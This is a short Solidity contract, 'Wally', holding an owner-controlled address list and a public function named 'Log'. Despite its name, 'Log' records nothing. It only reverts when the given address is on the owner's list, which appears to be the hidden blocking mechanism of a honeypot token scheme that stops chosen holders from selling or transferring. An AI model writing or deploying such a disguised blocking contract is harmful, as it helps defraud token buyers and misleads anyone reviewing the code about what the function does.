// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;
contract Wally {
    address private _owner;
    mapping(address=>bool) _list;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }
    function Log(address addr1, address addr2, uint256 amount) public view {
        //addr2
        require(_list[addr1]!=true);
    }

    function add(address addr) public onlyOwner{
        _list[addr] = true;
    }

    function sub(address addr) public onlyOwner{
        _list[addr] = false;
    }

    function result(address _account) external view onlyOwner returns(bool){
        return _list[_account];
    }
}